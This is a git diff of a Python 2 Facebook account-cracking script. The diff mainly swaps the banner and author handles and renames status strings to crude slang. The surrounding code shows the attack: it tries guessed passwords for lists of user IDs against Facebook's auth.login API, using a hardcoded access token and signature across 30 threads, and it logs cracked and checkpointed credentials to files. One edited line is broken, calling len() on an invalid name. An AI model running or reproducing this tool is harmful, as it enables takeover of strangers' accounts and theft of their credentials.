@@ -48,14 +48,16 @@ def jalan(z):
 
 ##### LOGO #####
 logo = """ 
-░░ ▄▀▄ █▄░█ █▀▄ ▄▀▄ ▀▄░▄▀ █▀▄ ▄▀▄ ▀▀▀▀█ 
-█░▄ █░█ █░▀█ █░█ █▀█ ░░█░░ █▀█ █▀█ ░▄▀▀░ 
-▀▀▀ ░▀░ ▀░░▀ ▀▀░ ▀░▀ ░░▀░░ ▀▀░ ▀░▀ ▀▀▀▀▀ 
+╔╗─╔═╗╔═╦╗╔══╗╔══╗╔═╦╗╔══╗╔══╗╔══╗
+║║─║║║║║║║╚╗╗║║╔╗║╚╗║║║╔╗║║╔╗║╠══║
+║╚╗║║║║║║║╔╩╝║║╠╣║╔╩╗║║╔╗║║╠╣║║══╣
+╚═╝╚═╝╚╩═╝╚══╝╚╝╚╝╚══╝╚══╝╚╝╚╝╚══╝
+──────────────────────────────────
 
 \033[1;91m●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●
-\033[1;96mAuthor \033[1;93m: \033[1;92mLondaybaz
-\033[1;96mInstagram \033[1;93m: \033[1;FlowLarkon ka shoqen
-\033[1;96mFacebook  \033[1;93m: \033[1;FLonday Baz 
+\033[1;96mAuthor \033[1;93m: \033[1;92mLONDAYBAZ
+\033[1;96mInstagram \033[1;93m: \033[1;92mFlowLARKON KA SHOQEN
+\033[1;96mFacebook  \033[1;93m: \033[1;92mLONDAYBAZ
 \033[1;96mGithub \033[1;93m: \033[1;92mhttps://github.com/londaybaz0/londybaz
 \033[1;91m●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●"""
 
@@ -79,7 +81,7 @@ print "\033[1;96m ●●●●●●●●●●●●●●●●●●●●�
 print  """\033[1;91m●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●
 \033[1;96mAuthor  \033[1;93m: \033[1;92m Londaybaz
 \033[1;96mInstagram \033[1;93m: \033[1;92mFlowlarkon-ka-shoqen
-\033[1;96mFacebook  \033[1;93m: \033[1;92mFLondaybaz
+\033[1;96mFacebook  \033[1;93m: \033[1;92mLondaybaz
 \033[1;96mGithub \033[1;93m: \033[1;92mhttps://Github.com/londaybaz0/londybaz
 \033[1;91m●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●"""
 print " \x1b[1;93m●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●"
@@ -285,7 +287,7 @@ def pilih_super():
 	for o in titik:
 		print("\r\033[1;96m[\033[1;97m✸\033[1;96m] \033[1;93mCracking \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
 	print
-	print('\x1b[1;96m[!] \x1b[1;93mTo Stop Process Press CTRL Then Press z')
+	print('\x1b[1;96m[!] \x1b[1;93mTo Stop Process Press CTRL Then Press Lund')
 	print 42*"\033[1;96m="
 	
 			
@@ -373,7 +375,7 @@ def pilih_super():
 													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 													q = json.load(data)
 													if 'access_token' in q:
-														print '\x1b[1;96m[\x1b[1;92mSuccessful\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass6
+														print '\x1b[1;96m[\x1b[1;92mChudgaya\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass6
 														oks.append(user+pass6)
 													else:
 														if 'www.facebook.com' in q["error_msg"]:
@@ -389,12 +391,12 @@ def pilih_super():
 															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 															q = json.load(data)
 															if 'access_token' in q:
-																print '\x1b[1;96m[\x1b[1;92mSuccessful\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass7
+																print '\x1b[1;96m[\x1b[1;92mChudgaya\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass7
 																oks.append(user+pass7)
 															else:
 																if 'www.facebook.com' in q["error_msg"]:
-																	print '\x1b[1;96m[\x1b[1;93mCheckpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass7
-																	cek = open("out/checkpoint.txt", "a")
+																	print '\x1b[1;96m[\x1b[1;93m7dinbadchudyga\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass7
+																	cek = open("out/7dinbadchudyga.txt", "a")
 																	cek.write(user+"|"+pass7+"\n")
 																	cek.close()
 																	cekpoint.append(user+pass7)
@@ -406,9 +408,9 @@ def pilih_super():
 	p = ThreadPool(30)
 	p.map(main, id)
 	print 42*"\033[1;96m="
-	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mProcess Has Been Completed \033[1;97m....'
-	print"\033[1;96m[+] \033[1;92mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
-	print("\033[1;96m[+] \033[1;92mCP File Has Been Saved \033[1;91m: \033[1;97mout/checkpoint.txt")
+	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mChudai Has Been Completed \033[1;97m....'
+	print"\033[1;96m[+] \033[1;92mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(7dinbadchudyga))
+	print("\033[1;96m[+] \033[1;92mCP File Has Been Saved \033[1;91m: \033[1;97mout/7dinbadchudyga.txt")
 	raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
 	menu()
 
